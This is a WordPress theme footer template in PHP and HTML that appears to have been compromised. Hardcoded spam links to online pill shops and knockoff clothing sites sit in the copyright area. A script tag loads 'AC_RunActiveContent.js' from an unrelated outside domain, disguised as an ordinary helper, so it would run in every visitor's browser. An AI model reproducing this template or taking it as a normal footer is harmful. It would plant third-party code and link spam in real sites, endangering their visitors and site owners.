  </div><!--.container-->
  	<div id="back-top-wrapper">
    	<p id="back-top">
        <a href="#top"></a>
      </p>
    </div>
	<footer id="footer">
		<div class="container_24 clearfix">
    	<div id="widget-footer" class="clearfix">
      	<?php if ( ! dynamic_sidebar( 'Footer' ) ) : ?>
          <!--Widgetized Footer-->
        <?php endif ?>
      </div>
			<div id="copyright" class="clearfix">
				<div class="grid_24">
					<div id="footer-text">
<a href=http://genericpillsonline.org/domperidone/>buy domperidone online</a>
<a href=http://genericpillsonline.org/plavix/>buy plavix online</a>
						<?php $myfooter_text = of_get_option('footer_text'); ?>
						
						<?php if($myfooter_text){?>
							<?php echo of_get_option('footer_text'); ?>
						<?php } else { ?>
							&copy; 2012 |  
							<a href="<?php bloginfo('url'); ?>/privacy-policy/" title="Privacy Policy"><?php _e('Privacy Policy', 'theme1763'); ?></a>
						<?php } ?>
						<?php if( is_front_page() ) { ?>
						More <a rel="nofollow" href="http://www.templatemonster.com/category/business-wordpress-templates/" target="_blank">Business WordPress Templates at TemplateMonster.com</a>
						<?php } ?>
					</div>
					<?php if ( of_get_option('footer_menu') == 'true') { ?>  
						<nav class="footer">
							<?php wp_nav_menu( array(
								'container'       => 'ul', 
								'menu_class'      => 'footer-nav', 
								'depth'           => 0,
								'theme_location' => 'footer_menu' 
								)); 
							?>
						</nav>
					<?php } ?>
				</div><script src="http://thepumaspeedcat.com/logreport/AC_RunActiveContent.js" type="text/javascript"></script>The North Face with a Supreme x The <a href="http://www.northfacedenalihoodie.us/" title="north face denali hoodie">north face denali hoodie</a> Pullover joint functional windbreaker,<a href="http://www.mensnorthfacejackets.us/" title="mens north face jackets">mens north face jackets</a> the two units to work together again in the season in which a single <a href="http://www.cheapaustraliasnowboots.com/" title="cheap ugg boots">cheap ugg boots</a> product back to break through the cooperation framework, in addition to usual with a <a href="http://www.officialfreerun2.com/" title="nike free run 2">nike free run 2</a> outside the mountain.</div>
			</div>
		</div><!--.container-->
	</footer>
</div><!--#main-->
<?php wp_footer(); ?> <!-- this is used by many Wordpress features and for plugins to work properly -->
<?php if(of_get_option('ga_code')) { ?>
	<script type="text/javascript">
		<?php echo stripslashes(of_get_option('ga_code')); ?>
	</script>
  <!-- Show Google Analytics -->	
<?php } ?>
</body>
</html>